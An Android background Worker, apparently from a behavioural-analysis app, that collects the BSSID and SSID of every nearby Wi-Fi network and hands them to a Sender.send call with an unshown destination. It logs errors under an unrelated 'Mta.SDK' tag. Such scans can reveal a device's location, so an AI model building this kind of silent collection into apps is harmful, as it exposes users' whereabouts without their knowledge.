package com.behavioralanalysis.service;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class Wifi extends Worker {
    public static final String TAG = "wifi";
    private Context context;

    public Wifi(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            JSONArray array = new JSONArray();
            WifiManager wifiManager = (WifiManager) context
                    .getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);

            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                List scans = wifiManager.getScanResults();
                if (scans != null && scans.size() > 0) {
                    for (int i = 0; i < scans.size(); i++) {
                        ScanResult scan = (ScanResult) scans.get(i);
                        JSONObject object = new JSONObject();
                        object.put("BSSID", scan.BSSID);
                        object.put("SSID", scan.SSID);
                        array.put(object);
                    }
                }
            }
            Sender.send(TAG, array.toString());
            return Result.success();
        } catch (Throwable th) {
            Toast.makeText(
                    context,
                    "Wifi.scan",
                    Toast.LENGTH_SHORT
            ).show();
            Log.e("Mta.SDK", "isWifiNet error", th);
            return Result.failure();
        }
    }
}